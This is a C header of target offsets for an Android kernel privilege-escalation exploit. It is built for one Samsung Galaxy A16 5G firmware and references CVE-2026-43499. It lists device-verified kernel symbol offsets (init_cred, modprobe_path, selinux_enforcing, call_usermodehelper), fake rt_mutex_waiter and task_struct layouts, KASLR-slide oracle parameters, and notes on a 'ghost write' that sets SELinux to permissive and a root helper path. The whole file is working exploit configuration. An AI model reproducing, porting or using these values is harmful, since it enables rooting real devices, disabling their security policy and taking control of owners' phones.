/*
 * Target: Samsung Galaxy A16 5G (SM-S166V)
 * Device codename: a16x
 * Firmware: S166VUDU7DZE9
 * Build fingerprint: samsung/a16xtfn/a16x:16/BP4A.251205.006/S166VUDU7DZE9:user/release-keys
 * Kernel: 5.15.189-android13-3-33503169
 * Android: 16 (SDK 36)
 *
 * All symbol offsets confirmed from vmlinux.nm (vmlinux.elf provided).
 * Layout constants cross-validated against SM-F731U (same KMI: 5.15.189-android13).
 *
 * Key notes (from F731U porting experience):
 *   MM_STRUCT_SZ=0x400: slabinfo confirms objsize=1024; BTF value 0x3e0 is WRONG.
 *   KMALLOC_CGROUP_TYPE=1, KMALLOC_CACHE_TYPES=2: device has kmalloc-rcl-* (not -cg-*).
 *   COMPACT_RT_MUTEX_WAITER=1: confirmed by selinux_permissive.c iov layout (task=+0x30).
 *   SLIDE_PSELECT_WORD_SHIFT=3: same 5.15.189-android13 KMI branch as F731U.
 *   KERNELSNITCH_FUTEX_HASH_SIZE=0x800: 8 cores, roundup_pow2(256*8)=2048=0x800.
 *   KERNELSNITCH_VERBOSE must be 0: verbose printf breaks ns-scale timing.
 *   KERNELSNITCH_IDENTITY_END=0xffffff9000000000: 64GB; narrowing causes reboots.
 *   ASHMEM_MISC_FOPS_OFF = ashmem_misc + offsetof(miscdevice,fops)=0x10 = 0x02474250.
 */

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "a16x-S166VUDU7DZE9-app"
#define APP_PHYS_P0_ORACLE 1
/*
 * Ghost-write path (device-verified).  The pselect/P0-oracle route does not
 * work on this kernel (reboots at page-prepare); selinux_ghost.c embeds the
 * standalone selinux_permissive binary that is confirmed working on this
 * device and flips SELinux to permissive via the PI-chain ghost write.
 * GHOST_ONLY=1 env stops after the flip (verification mode).
 */
#define SELINUX_GHOST_WRITE 1
#else
#define BUILD_VARIANT_LABEL "a16x-S166VUDU7DZE9-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a16xtfn/a16x:16/BP4A.251205.006/S166VUDU7DZE9:user/release-keys"
#endif

/* ---- Address space -------------------------------------------------------- */
#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL
#define P0_PAGE_OFFSET       0xffffff8000000000ULL
#define P0_PHYS_OFFSET       0x80000000ULL
#define P0_KERNEL_PHYS_LOAD  0x80000000ULL

/* ---- SKB delta (same as F731U / all 5.15.189-android13 targets) ---------- */
#define SKB_DATA_DELTA (-0xe80LL)

/* ---- mm_struct slab size (CONFIRMED: /proc/slabinfo objsize=1024=0x400) --- */
/* BTF sizeof(mm_struct)=0x3e0 is WRONG -- slab aligns to 64: ALIGN(0x3e8,64)=0x400 */
#define MM_STRUCT_SZ 0x400

/* ---- kmalloc type corrections ---------------------------------------------- */
/* Device has kmalloc-X (NORMAL=0) and kmalloc-rcl-X (RECLAIM=1), no kmalloc-cg-X */
/* common.h defaults KMALLOC_CGROUP_TYPE=2 and KMALLOC_CACHE_TYPES=4 are WRONG */
#define KMALLOC_CGROUP_TYPE  1
#define KMALLOC_CACHE_TYPES  2

/* ---- KernelSnitch tuning --------------------------------------------------- */
/* 8 cores: futex_hashsize = roundup_pow2(256*8) = 2048 = 0x800 */
#define KERNELSNITCH_FUTEX_HASH_SIZE 0x800
/* KERNELSNITCH_VERBOSE must stay 0: printf in ns-level timing loop → reboots */
/* KERNELSNITCH_MTE_ENABLED stays 0: arm64.nomte in cmdline */
/* KSNITCH_COLLISIONS stays at default 4 */

/* ---- Direct map / vmemmap ------------------------------------------------- */
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
/* Must be full 64GB; narrowing misses sk_buff objects and causes reboots */
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* ---- rt_mutex_waiter layout (COMPACT, confirmed by selinux_permissive.c) -- */
/* iov[4].iov_base=init_task → waiter+0x30=task; iov[4].iov_len=lock → waiter+0x38=lock */
#define COMPACT_RT_MUTEX_WAITER        1
#define SLIDE_FAKE_WAITER_PRIO         0
#define SLIDE_WAITER_WAKE_STATE        0
#define SLIDE_LOCK_OWNER_VALUE         1ULL
#define SLIDE_USE_FAKE_TASK            1
#define SLIDE_PSELECT_WORD_SHIFT       3  /* same 5.15.189-android13 KMI as F731U */

#define FAKE_WAITER_PI_TREE_ENTRY_OFF  0x18
#define FAKE_WAITER_TASK_OFF           0x30
#define FAKE_WAITER_LOCK_OFF           0x38
#define FAKE_WAITER_WAKE_STATE_OFF     0x40
#define FAKE_WAITER_PRIO_OFF           0x44
#define FAKE_WAITER_DEADLINE_OFF       0x48
#define FAKE_WAITER_WW_CTX_OFF         0x50
#define FAKE_WAITER_LAYOUT_SIZE        0x58

/* ---- task_struct layout (confirmed from vmlinux disasm) ------------------- */
#define FAKE_TASK_USAGE_OFF            0x38
#define FAKE_TASK_PRIO_OFF             0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF      0x84
#define FAKE_TASK_TASK_GROUP_OFF       0x400  /* sched_task_group, same as F731U 5.15.189 */
#define FAKE_TASK_PI_LOCK_OFF          0x884
#define FAKE_TASK_PI_WAITERS_OFF       0x898
#define FAKE_TASK_PI_TOP_TASK_OFF      0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF    0x8b0

/* ---- Symbol offsets (confirmed from vmlinux.nm) --------------------------- */
#define INIT_TASK_OFF                       0x0231fc40ULL
#define ROOT_TASK_GROUP_OFF                 0x02505f40ULL
#define SELINUX_ENFORCING_OFF               0x025d8f50ULL  /* selinux_state.enforcing at +0 */
#define KMALLOC_CACHES_OFF                  0x01abc4f0ULL
#define ANON_PIPE_BUF_OPS_OFF               0x018f0760ULL
#define SYSTEM_UNBOUND_WQ_OFF               0x0230ae20ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x00100db8ULL
#define INIT_CRED_OFF                       0x01b6cab8ULL  /* init_cred, root cred (writable .data) */
#define EMPTY_ZERO_PAGE_OFF                 0x02501000ULL  /* empty_zero_page (all-zero page) */

/* ---- task_struct offsets (confirmed via vmlinux.btf) ----------------------- */
#define TASK_TASKS_OFF              0x4d0   /* struct list_head tasks */
#define TASK_PID_OFF                0x5d8
#define TASK_REAL_CRED_OFF          0x790
#define TASK_CRED_OFF               0x798
#define TASK_COMM_OFF               0x7a8

#define ASHMEM_FOPS_OFF                     0x01a6a198ULL
#define ASHMEM_MISC_FOPS_OFF                0x02474250ULL  /* ashmem_misc + offsetof(miscdevice,fops)=0x10 */
#define ASHMEM_IOCTL_OFF                    0x00c61b44ULL
#define ASHMEM_COMPAT_IOCTL_OFF             0x00c620fcULL
#define ASHMEM_MMAP_OFF                     0x00c62154ULL
#define ASHMEM_OPEN_OFF                     0x00c62390ULL
#define ASHMEM_RELEASE_OFF                  0x00c62414ULL
#define ASHMEM_SHOW_FDINFO_OFF              0x00c62534ULL

#define CONFIGFS_READ_ITER_OFF              0x00475e80ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF         0x0047633cULL
#define COPY_SPLICE_READ_OFF                0x003fd120ULL  /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF                     0x003b2200ULL

/* ---- Slide KASLR oracle symbols (confirmed from vmlinux) ------------------ */
#define SLIDE_TRACEFS_EVENT_ID              108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF     0x001085c0ULL  /* after bl schedule in worker_thread */
#define SLIDE_MAX_CANDIDATE                 0x1f0000ULL  /* confirmed max plausible slide */
#define MODPROBE_PATH_OFF                   0x0233a390ULL  /* modprobe_path, CONFIG_MODULES=y (from vmlinux.nm) */
#define SLIDE_NFULNL_LOGGER_NAME_OFF        0x017f35b5ULL  /* *nfulnl_logger.name string */
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF      0x02312598ULL  /* nfulnl_logger object */
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02433178ULL
#define SLIDE_SYSCTL_BOOTID_OFF             0x026be0c9ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE        1ULL

#define SLIDE_INIT_TASK_OFF                 INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF           ROOT_TASK_GROUP_OFF

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

/* ---- Derived image address macros ----------------------------------------- */
#define INIT_TASK              (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP        (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING      (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES         (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS      (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ      (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
    (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define INIT_CRED              (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define EMPTY_ZERO_PAGE        (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)

#define ASHMEM_FOPS            (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_MISC_FOPS       (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_IOCTL           (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL    (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP            (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN            (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE         (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO     (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ       (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK            (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define MODPROBE_PATH               (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)

/* ---- Payload page in-slab offsets (same as F731U / all targets) ----------- */
#define LOCK_OFF       0x2210
#define W0_OFF         0x2350
#define FOPS_OFF       0x2000
#define SCRATCH_OFF    0x3000
#define RIGHT_OFF      0x4440
#define LEFT_OFF       0x5550
#define FAKE_TASK_OFF  0x3200

/* ---- Root UMH paths ------------------------------------------------------- */
#define ROOT_UMH_PATH     "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---- file_operations table entry offsets ---------------------------------- */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xc8
#define FOPS_SHOW_FDINFO_OFF  0xe0

/* ---- Configfs fake-object page layout offsets ----------------------------- */
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* ---- Workqueue layout (confirmed same as F731U / all 5.15 targets) -------- */
#define WQ_DFL_PWQ_OFF       0xb0
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x5c
#define PWQ_MAX_ACTIVE_OFF   0x60
/* worker_pool offsets re-derived from a16x vmlinux.btf (differs from the
 * Qualcomm F731U layout by 8 bytes: this Exynos kernel has watchdog_ts before
 * worklist).  F731U values (0x28/0x3c) are WRONG here. */
#define POOL_WORKLIST_OFF    0x20
#define POOL_NR_IDLE_OFF     0x34
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18

/* ---- struct page layout (arm64 5.15 standard) ----------------------------- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- Pipe ------------------------------------------------------------------ */
#define PIPE_BUFFER_SLOTS    32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ---- APP_PAYLOAD-only parameters ------------------------------------------ */
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS              8
#define PSELECT_ENTER_DELAY_USEC        50000
#define SLIDE_PSELECT_TIMEOUT_NSEC      100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES  2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE           8
#define SLIDE_BANK_SLOTS                4
#define SLIDE_BANK_TASK_OFF             0x1000
#define SLIDE_BANK_TASK_STRIDE          0x1c0
#define SLIDE_BANK_LOCK_OFF             0x5200
#define SLIDE_BANK_SLOT_STRIDE          0x100
#define SLIDE_BANK_WAITER_OFF           0x40
#define P0_ORACLE_GATE_SLOT             0
#define P0_ORACLE_PROBE_SLOT            1
#define P0_ORACLE_GATE_RESTORE_SLOT     2
#define P0_ORACLE_PROBE_RESTORE_SLOT    3
#define P0_ORACLE_GATE_PAGE_OFF         0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX     1
#define P0_ORACLE_PROBE_OFFSET          0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/a16x-S166VUDU7DZE9/p0_fingerprint.h"
/* Suppress unused-function warning for put_slide_bank_entry (APP_PHYS_P0_ORACLE path) */
#define SLIDE_PSELECT_NFDS              320
#endif /* APP_PAYLOAD */

#endif /* OFFSET_H */
